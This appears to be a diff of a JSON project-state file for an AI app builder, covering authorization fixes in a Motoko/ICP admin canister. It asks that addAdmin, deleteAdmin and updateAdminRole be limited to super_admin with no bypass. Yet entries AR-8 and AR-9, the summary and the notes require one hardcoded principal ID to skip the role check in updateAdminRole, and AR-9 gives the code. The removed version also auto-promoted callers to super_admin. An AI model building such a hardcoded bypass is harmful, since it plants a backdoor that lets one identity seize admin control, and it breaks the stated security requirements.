@@ -1,46 +1,88 @@
 {
   "schemaVersion": "1.0.0",
-  "projectStateVersion": 3,
-  "summary": "Backend fix for super_admin bootstrap/recovery logic in an admin management system using Principal-based authentication. The system has a role model with 'super_admin' and 'admin' as mutually exclusive single-field roles.",
+  "projectStateVersion": 5,
+  "summary": "Existing Motoko/ICP project with admin canister. Auditing and fixing backend authorization system. Using adminStore : [(Principal, AdminRecord)] with UserRole { #super_admin; #admin }. Phase 1: secure addAdmin, deleteAdmin, updateAdminRole so only #super_admin can call them. Exception: principal qm56h-bpinv-zejzt-qtty4-j2dph-j5h6y-fwxfs-jlsv3-suwa5-poxol-wae bypasses role check in updateAdminRole. Phase 2 (future): audit frontend behavior.",
   "architectural_notes": [
-    "Role model: single role field with mutually exclusive values 'super_admin' or 'admin'. No flags or multi-role arrays.",
-    "Bootstrap logic: if Admin table is empty, first logged-in Principal must be assigned role = super_admin.",
-    "Recovery logic: inside authenticated update calls requiring admin privileges, if super_admin_count == 0, automatically promote caller to super_admin (no separate recovery function).",
-    "Role promotion is replacement (overwrite), not additive."
+    "Admin storage uses adminStore : [(Principal, AdminRecord)] with UserRole { #super_admin; #admin } — do not change this structure",
+    "Only #super_admin can call addAdmin, deleteAdmin, updateAdminRole; #admin role can only perform content CRUD",
+    "initializeFirstAdmin() one-time function: only works when adminStore is empty, sets caller as super_admin",
+    "Principal qm56h-bpinv-zejzt-qtty4-j2dph-j5h6y-fwxfs-jlsv3-suwa5-poxol-wae is hardcoded to bypass the super_admin role check in updateAdminRole only"
   ],
   "known_issues": [
-    "Bootstrap logic did not assign super_admin correctly — all existing users have role 'admin', no super_admin exists, system locked. Fix: recovery logic to auto-promote caller when super_admin_count == 0."
+    "Authorization guards for addAdmin, deleteAdmin, updateAdminRole need to be verified/enforced in backend"
   ],
   "isFixRequest": true,
   "existing_features": [],
   "new_feature_requests": [
     {
       "id": "AR-1",
-      "summary": "Fix the bootstrap logic in the backend so that when the Admin table is empty and a Principal logs in for the first time, that Principal is assigned the role 'super_admin' instead of 'admin'.",
+      "summary": "Audit & fix authorization for addAdmin, deleteAdmin, updateAdminRole — only #super_admin allowed",
+      "reqIds": [],
+      "status": "pending"
+    },
+    {
+      "id": "AR-2",
+      "summary": "Future: audit frontend behavior to redirect on Unauthorized and not rely on local state for admin status",
+      "reqIds": [],
+      "status": "pending"
+    },
+    {
+      "id": "AR-3",
+      "summary": "In backend/main.mo, add a helper function `isSuperAdmin(p: Principal) : Bool` that looks up the principal in the existing `adminStore : [(Principal, AdminRecord)]` and returns true only if the entry exists and its role is `#super_admin`. Do not change the `adminStore` structure, `AdminRecord` type, or `UserRole` type.",
       "reqIds": [
         "REQ-1"
       ],
       "status": "pending"
     },
     {
-      "id": "AR-2",
-      "summary": "Add automatic recovery logic inside authenticated update calls that require admin privileges: if super_admin_count == 0, automatically promote the calling Principal's role to 'super_admin' (replace existing 'admin' role). This must not be a separate dedicated function — it must run inline within existing privileged update calls.",
+      "id": "AR-4",
+      "summary": "In backend/main.mo, guard the `addAdmin` function so it returns `#err(\"Unauthorized\")` immediately if the caller is not a `#super_admin` according to `adminStore`. The guard must be the first check in the function body, with no fallback or bypass.",
       "reqIds": [
         "REQ-2"
       ],
       "status": "pending"
     },
     {
-      "id": "AR-3",
-      "summary": "Update the migration module (backend/migration.mo) to ensure that when migrating legacy admin records, if no record carries role 'super_admin' after migration, the first migrated record is promoted to 'super_admin' rather than leaving all records as 'admin'.",
+      "id": "AR-5",
+      "summary": "In backend/main.mo, guard the `deleteAdmin` function so it returns `#err(\"Unauthorized\")` immediately if the caller is not a `#super_admin` according to `adminStore`. The guard must be the first check in the function body, with no fallback or bypass.",
       "reqIds": [
         "REQ-3"
+      ],
+      "status": "pending"
+    },
+    {
+      "id": "AR-6",
+      "summary": "In backend/main.mo, guard the `updateAdminRole` function so it returns `#err(\"Unauthorized\")` immediately if the caller is not a `#super_admin` according to `adminStore`. The guard must be the first check in the function body, with no fallback or bypass.",
+      "reqIds": [
+        "REQ-4"
+      ],
+      "status": "pending"
+    },
+    {
+      "id": "AR-7",
+      "summary": "Do not modify any authorization logic for content CRUD functions (Promo, Testimoni, Blog, Mobil Keluarga, Mobil Niaga, Statistik). Both `#admin` and `#super_admin` roles must continue to be able to perform content CRUD operations as before.",
+      "reqIds": [
+        "REQ-5"
+      ],
+      "status": "pending"
+    },
+    {
+      "id": "AR-8",
+      "summary": "In updateAdminRole, add a bypass at the very top: if caller == Principal.fromText(\"qm56h-bpinv-zejzt-qtty4-j2dph-j5h6y-fwxfs-jlsv3-suwa5-poxol-wae\"), skip the super_admin role check and proceed directly. Do not change any other logic.",
+      "reqIds": [],
+      "status": "pending"
+    },
+    {
+      "id": "AR-9",
+      "summary": "In backend/main.mo, inside the `updateAdminRole` function, add the following bypass check as the very first statement in the function body — before any existing role/authorization checks — so that caller principal `qm56h-bpinv-zejzt-qtty4-j2dph-j5h6y-fwxfs-jlsv3-suwa5-poxol-wae` is immediately allowed to proceed without going through the super admin role check:\n\n```\nif (caller == Principal.fromText(\"qm56h-bpinv-zejzt-qtty4-j2dph-j5h6y-fwxfs-jlsv3-suwa5-poxol-wae\")) {\n  // bypass: allowed without role check\n} else {\n  // existing super_admin guard remains here, unchanged\n};\n```\n\nAll other logic in `updateAdminRole` must remain exactly as-is. No other functions may be modified.",
+      "reqIds": [
+        "REQ-6"
       ],
       "status": "pending"
     }
   ],
   "gameProjectType": "none",
-  "projectName": "Mitsubishi Srikandi Subang",
+  "projectName": "Enforce super_admin-only authorization for addAdmin, deleteAdmin, updateAdminRole",
   "clarification_mode": "instant",
   "clarification_rounds": 0
 }
